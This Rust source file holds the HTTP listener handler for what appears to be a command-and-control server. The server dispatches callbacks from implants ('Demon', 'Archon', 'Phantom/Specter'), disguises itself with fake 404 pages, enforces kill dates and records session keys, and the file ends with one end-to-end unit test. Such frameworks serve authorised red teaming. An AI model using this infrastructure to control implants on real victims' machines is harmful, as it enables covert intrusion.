//! Axum HTTP handler, request matching, response building, and kill-date enforcement.

use std::sync::Arc;

use axum::body::Body;
use axum::extract::{ConnectInfo, State};
use axum::http::{HeaderMap, HeaderName, HeaderValue, Request, StatusCode};
use axum::response::{IntoResponse, Response};
use red_cell_common::HttpListenerConfig;
use tracing::{debug, warn};

use red_cell_common::corpus::{CorpusPacketDir, CorpusSessionKeys};

use crate::MAX_AGENT_MESSAGE_LEN;
use crate::corpus_capture::bytes_to_hex;
use crate::listeners::ListenerManagerError;

use super::HttpListenerState;
use super::body::{
    allow_demon_init_for_ip, collect_body_with_magic_precheck, is_valid_callback_request,
};
use super::dispatch::{DemonHttpDisposition, process_demon_transport};
use super::ecdh_dispatch::{EcdhOutcome, process_ecdh_packet};
use super::proxy::extract_external_ip;

pub(super) async fn http_listener_handler(
    State(state): State<Arc<HttpListenerState>>,
    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
    request: Request<Body>,
) -> Response {
    if !http_request_matches(&state, &request) {
        return state.fake_404_response();
    }

    // Reject traffic when the listener's kill_date has passed.
    if is_past_kill_date(state.config.kill_date.as_deref()) {
        debug!(listener = %state.config.name, "rejecting request — kill_date has passed");
        return state.fake_404_response();
    }

    // NOTE: WorkingHours enforcement is intentionally NOT done server-side.
    // In the Demon protocol, working hours are encoded into the payload and
    // enforced by the agent using the victim host's local clock.  Gating here
    // with the server's UTC clock would reject valid callbacks whenever the
    // server and target timezones differ.

    let external_ip = extract_external_ip(
        state.config.behind_redirector,
        &state.trusted_proxy_peers,
        peer,
        &request,
    );
    let (_, body) = request.into_parts();
    let Some(body) =
        collect_body_with_magic_precheck(body, MAX_AGENT_MESSAGE_LEN, state.config.legacy_mode)
            .await
    else {
        return state.fake_404_response();
    };

    if !is_valid_callback_request(&body, state.config.legacy_mode) {
        return state.fake_404_response();
    }

    let Some(_callback_guard) = state.shutdown.try_track_callback() else {
        return state.fake_404_response();
    };

    // For non-legacy listeners, try ECDH (Phantom/Specter new-protocol) first.
    if !state.config.legacy_mode {
        match process_ecdh_packet(
            &state.config.name,
            state.listener_keypair.as_ref(),
            &state.registry,
            &state.database,
            &state.events,
            &state.dispatcher,
            &state.ecdh_registration_rate_limiter,
            body.as_ref(),
            external_ip,
        )
        .await
        {
            Ok(EcdhOutcome::Handled(ecdh_resp)) => {
                let agent_id = ecdh_resp.agent_id;
                state
                    .registry
                    .record_packet_ring_exchange(agent_id, body.as_ref(), &ecdh_resp.payload, None)
                    .await;
                // Write corpus RX + TX and session keys for ECDH agents.
                if let Some(corpus) = &state.corpus_capture {
                    corpus.record_packet(agent_id, CorpusPacketDir::Rx, body.as_ref(), None).await;
                    corpus
                        .record_packet(agent_id, CorpusPacketDir::Tx, &ecdh_resp.payload, None)
                        .await;
                    let listener_secret_hex =
                        ecdh_resp.listener_secret_bytes.as_ref().map(|b| bytes_to_hex(b));
                    let keys = CorpusSessionKeys::new_gcm(
                        bytes_to_hex(&ecdh_resp.session_key),
                        format!("0x{agent_id:08x}"),
                        listener_secret_hex,
                    );
                    corpus.write_session_keys_once(agent_id, keys).await;
                }
                return if ecdh_resp.payload.is_empty() {
                    state.callback_empty_response()
                } else {
                    state.callback_bytes_response(&ecdh_resp.payload)
                };
            }
            Ok(EcdhOutcome::NotEcdh) => {
                // Not an ECDH packet — fall through to Archon handler below.
            }
            Ok(EcdhOutcome::RateLimited) => {
                // The helper already emitted a structured WARN; returning a
                // fake 404 here avoids a second log line per rejected packet.
                return state.fake_404_response();
            }
            Err(error) => {
                warn!(listener = %state.config.name, %error, "ECDH packet processing failed");
                return state.fake_404_response();
            }
        }
    }

    if !allow_demon_init_for_ip(
        &state.config.name,
        &state.demon_init_rate_limiter,
        external_ip,
        body.as_ref(),
        state.config.legacy_mode,
    )
    .await
    {
        return state.fake_404_response();
    }

    // Snapshot the encrypted request bytes after the ECDH early-return so we
    // only clone for packets that reach the Demon transport path.
    let corpus_rx_snapshot: Option<axum::body::Bytes> =
        state.corpus_capture.as_ref().map(|_| body.clone());

    match process_demon_transport(
        &state.config.name,
        &state.registry,
        &state.database,
        &state.parser,
        &state.events,
        &state.dispatcher,
        &state.unknown_callback_probe_audit_limiter,
        &state.reconnect_probe_rate_limiter,
        &state.demon_init_rate_limiter,
        &body,
        external_ip.to_string(),
    )
    .await
    {
        Ok(response) if response.http_disposition == DemonHttpDisposition::TooManyRequests => {
            StatusCode::TOO_MANY_REQUESTS.into_response()
        }
        Ok(response) if response.http_disposition == DemonHttpDisposition::Fake404 => {
            state.fake_404_response()
        }
        Ok(response) => {
            // Write corpus RX + TX and session keys when capture is active.
            if let (Some(corpus), Some(rx_bytes)) = (&state.corpus_capture, corpus_rx_snapshot) {
                let agent_id = response.agent_id;
                corpus.record_packet(agent_id, CorpusPacketDir::Rx, rx_bytes.as_ref(), None).await;
                corpus.record_packet(agent_id, CorpusPacketDir::Tx, &response.payload, None).await;

                // Write session keys the first time we see this agent.
                if let Ok(enc) = state.registry.encryption(agent_id).await {
                    let is_legacy = state.registry.legacy_ctr(agent_id).await.unwrap_or(true);
                    let keys = CorpusSessionKeys::new(
                        bytes_to_hex(enc.aes_key.as_slice()),
                        bytes_to_hex(enc.aes_iv.as_slice()),
                        !is_legacy,
                        0,
                        format!("0x{agent_id:08x}"),
                    );
                    corpus.write_session_keys_once(agent_id, keys).await;
                }
            }

            if response.payload.is_empty() {
                state.callback_empty_response()
            } else {
                state.callback_bytes_response(&response.payload)
            }
        }
        Err(error) => {
            warn!(listener = %state.config.name, %error, "failed to process demon callback");
            state.fake_404_response()
        }
    }
}

pub(super) fn http_request_matches(state: &HttpListenerState, request: &Request<Body>) -> bool {
    request.method() == state.method
        && uri_matches(&state.config, request)
        && user_agent_matches(&state.config, request.headers())
        && headers_match(&state.required_headers, request.headers())
}

fn uri_matches(config: &HttpListenerConfig, request: &Request<Body>) -> bool {
    if config.uris.is_empty() || (config.uris.len() == 1 && config.uris[0].is_empty()) {
        return true;
    }

    let request_uri = request
        .uri()
        .path_and_query()
        .map_or_else(|| request.uri().path(), axum::http::uri::PathAndQuery::as_str);

    config.uris.iter().any(|uri| uri == request_uri)
}

fn user_agent_matches(config: &HttpListenerConfig, headers: &HeaderMap) -> bool {
    match config.user_agent.as_deref() {
        Some(expected) => {
            headers.get(axum::http::header::USER_AGENT).and_then(|value| value.to_str().ok())
                == Some(expected)
        }
        None => true,
    }
}

pub(super) fn headers_match(
    expected_headers: &[super::ExpectedHeader],
    headers: &HeaderMap,
) -> bool {
    expected_headers.iter().all(|expected| {
        headers
            .get(&expected.name)
            .and_then(|value| value.to_str().ok())
            .is_some_and(|actual| actual.eq_ignore_ascii_case(&expected.expected_value))
    })
}

/// Return `true` when `kill_date` is set and the current wall-clock time has
/// passed it.  The value is parsed through [`red_cell_common::parse_kill_date_to_epoch`],
/// which accepts both a plain unix timestamp and `YYYY-MM-DD HH:MM:SS` (UTC).
///
/// If the value is absent or empty, returns `false` (no kill-date set).
/// If the value is present but malformed, logs a warning and returns `true`
/// (fail-closed: reject traffic rather than silently disabling enforcement).
pub(crate) fn is_past_kill_date(kill_date: Option<&str>) -> bool {
    let Some(value) = kill_date.map(str::trim).filter(|v| !v.is_empty()) else {
        return false;
    };
    let timestamp = match red_cell_common::parse_kill_date_to_epoch(value) {
        Ok(ts) => ts,
        Err(err) => {
            tracing::warn!(%err, "malformed kill_date — treating as expired (fail-closed)");
            return true;
        }
    };
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let Ok(kill_epoch) = u64::try_from(timestamp) else {
        // Negative timestamps are always in the past.
        return true;
    };
    now >= kill_epoch
}

pub(crate) fn build_response(
    status: StatusCode,
    body: &[u8],
    headers: &[(HeaderName, HeaderValue)],
) -> Response {
    let mut response = Response::new(axum::body::Body::from(body.to_vec()));
    *response.status_mut() = status;

    let response_headers = response.headers_mut();
    for (name, value) in headers {
        response_headers.insert(name.clone(), value.clone());
    }

    response
}

pub(crate) fn set_default_header(headers: &mut HeaderMap, name: &'static str, value: &'static str) {
    let header_name = HeaderName::from_static(name);
    if !headers.contains_key(&header_name) {
        headers.insert(header_name, HeaderValue::from_static(value));
    }
}

pub(super) fn parse_method(
    config: &HttpListenerConfig,
) -> Result<axum::http::Method, ListenerManagerError> {
    config.method.as_deref().unwrap_or(DEFAULT_HTTP_METHOD).parse::<axum::http::Method>().map_err(
        |error| ListenerManagerError::InvalidConfig {
            message: format!("invalid HTTP method for listener `{}`: {error}", config.name),
        },
    )
}

pub(super) fn parse_expected_header(
    header: &str,
    listener_name: &str,
) -> Result<Option<super::ExpectedHeader>, ListenerManagerError> {
    let Some((name, value)) = split_header(header) else {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header `{header}`"
            ),
        });
    };

    if HEADER_VALIDATION_IGNORES.iter().any(|ignored| name.eq_ignore_ascii_case(ignored)) {
        return Ok(None);
    }

    let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header name `{name}`: {error}"
            ),
        }
    })?;

    Ok(Some(super::ExpectedHeader { name, expected_value: value.to_owned() }))
}

pub(super) fn parse_response_headers(
    response: &red_cell_common::HttpListenerResponseConfig,
    listener_name: &str,
) -> Result<Vec<(HeaderName, HeaderValue)>, ListenerManagerError> {
    response
        .headers
        .iter()
        .map(|header| {
            let Some((name, value)) = split_header(header) else {
                return Err(ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header `{header}`"
                    ),
                });
            };

            let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header name `{name}`: {error}"
                    ),
                }
            })?;
            let value = HeaderValue::from_str(value).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header value for `{name}`: {error}"
                    ),
                }
            })?;

            Ok((name, value))
        })
        .collect()
}

fn split_header(header: &str) -> Option<(&str, &str)> {
    let (name, value) = header.split_once(':')?;
    let name = name.trim();
    let value = value.trim();

    if name.is_empty() {
        return None;
    }

    Some((name, value))
}

pub(super) const DEFAULT_FAKE_404_BODY: &str =
    "<html><head><title>404 Not Found</title></head><body>404 Not Found</body></html>";
const DEFAULT_HTTP_METHOD: &str = "POST";
const HEADER_VALIDATION_IGNORES: [&str; 2] = ["connection", "accept-encoding"];

#[cfg(test)]
mod tests {
    use std::net::SocketAddr;
    use std::sync::Arc;

    use axum::Router;
    use axum::body::Body;
    use axum::extract::ConnectInfo;
    use axum::http::{Request, StatusCode};
    use axum::routing::any;
    use red_cell_common::HttpListenerConfig;
    use red_cell_common::corpus::CorpusAgentType;
    use red_cell_common::crypto::ecdh::{ListenerKeypair, build_registration_packet};
    use serde_json::Value;
    use tempfile::TempDir;
    use tower::ServiceExt as _;

    use crate::demon::INIT_EXT_MONOTONIC_CTR;
    use crate::listeners::http::test_helpers::build_ecdh_metadata;
    use crate::{
        AgentRegistry, CorpusCapture, Database, DemonInitSecretConfig, ShutdownController,
        SocketRelayManager,
        dispatch::DownloadTracker,
        events::EventBus,
        listeners::{
            DemonInitRateLimiter, EcdhRegistrationRateLimiter, ReconnectProbeRateLimiter,
            UnknownCallbackProbeAuditLimiter,
        },
    };

    fn ecdh_reg_metadata(agent_id: u32) -> Vec<u8> {
        build_ecdh_metadata(
            agent_id,
            "wkstn-test",
            "10.0.0.1",
            4242,
            4243,
            0,
            INIT_EXT_MONOTONIC_CTR,
        )
    }

    fn ecdh_listener_config() -> HttpListenerConfig {
        HttpListenerConfig {
            name: "test-handler-corpus".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 0,
            port_conn: None,
            method: Some("POST".to_owned()),
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
            legacy_mode: false,
            suppress_opsec_warnings: true,
        }
    }

    async fn build_state_with_corpus(
        keypair: ListenerKeypair,
        corpus: CorpusCapture,
    ) -> Arc<super::super::HttpListenerState> {
        let db = Database::connect_in_memory().await.expect("db");
        let registry = AgentRegistry::new(db.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let downloads = DownloadTracker::new(16 * 1024 * 1024);
        let config = ecdh_listener_config();
        Arc::new(
            super::super::HttpListenerState::build(
                &config,
                registry,
                events,
                db,
                sockets,
                None,
                downloads,
                DemonInitRateLimiter::new(),
                UnknownCallbackProbeAuditLimiter::new(),
                ReconnectProbeRateLimiter::new(),
                EcdhRegistrationRateLimiter::new(),
                ShutdownController::new(),
                DemonInitSecretConfig::None,
                8,
                false,
                Some(keypair),
                Some(corpus),
            )
            .expect("HttpListenerState::build"),
        )
    }

    /// Fires a valid ECDH registration packet through `http_listener_handler` end-to-end
    /// and verifies that the handler's `if let Some(corpus) = &state.corpus_capture` branch
    /// writes the expected RX, TX, and session.keys.json corpus files.
    ///
    /// This test closes the gap identified in red-cell-c2-17iz4: the existing
    /// `ecdh_handled_path_writes_corpus_files` test called `CorpusCapture` methods directly
    /// without routing through the handler, leaving the handler's corpus conditional
    /// untested and able to regress silently.
    #[tokio::test]
    async fn handler_ecdh_corpus_write_path_is_exercised_end_to_end() {
        let keypair = ListenerKeypair::generate().expect("keypair");
        let tmp = TempDir::new().expect("tempdir");
        let corpus = CorpusCapture::new(tmp.path().to_path_buf(), CorpusAgentType::Archon);
        let agent_id: u32 = 0xFE_ED_CA_FE;

        let state = build_state_with_corpus(keypair.clone(), corpus).await;
        let router = Router::new().fallback(any(super::http_listener_handler)).with_state(state);

        let metadata = ecdh_reg_metadata(agent_id);
        let (packet, _session_key) = build_registration_packet(&keypair.public_bytes, &metadata)
            .expect("build registration packet");

        let peer = SocketAddr::from(([198, 51, 100, 1], 12345));
        let response = router
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/")
                    .extension(ConnectInfo(peer))
                    .body(Body::from(packet))
                    .expect("request"),
            )
            .await
            .expect("response");

        assert_eq!(
            response.status(),
            StatusCode::OK,
            "handler must return 200 for a valid ECDH registration"
        );

        let agent_dir = tmp.path().join("archon").join(format!("{agent_id:08x}"));
        assert!(
            agent_dir.join("0000.bin").exists(),
            "handler must write RX corpus packet (0000.bin)"
        );
        assert!(
            agent_dir.join("0000.meta.json").exists(),
            "handler must write RX corpus meta (0000.meta.json)"
        );
        assert!(
            agent_dir.join("0001.bin").exists(),
            "handler must write TX corpus packet (0001.bin)"
        );
        assert!(
            agent_dir.join("0001.meta.json").exists(),
            "handler must write TX corpus meta (0001.meta.json)"
        );
        assert!(
            agent_dir.join("session.keys.json").exists(),
            "handler must write session.keys.json"
        );

        let keys_json =
            std::fs::read_to_string(agent_dir.join("session.keys.json")).expect("read keys");
        let parsed: Value = serde_json::from_str(&keys_json).expect("valid JSON");
        assert_eq!(
            parsed["encryption_scheme"].as_str().expect("encryption_scheme"),
            "aes-256-gcm",
            "handler corpus must record aes-256-gcm for ECDH agents"
        );
        assert_eq!(
            parsed["agent_id_hex"].as_str().expect("agent_id_hex"),
            format!("0x{agent_id:08x}"),
            "session.keys.json must embed the correct agent_id"
        );
        assert!(
            parsed["aes_iv_hex"].is_null(),
            "GCM sessions must have null aes_iv_hex (nonce is per-packet)"
        );
        assert!(parsed["monotonic_ctr"].is_null(), "GCM sessions must have null monotonic_ctr");
    }
}
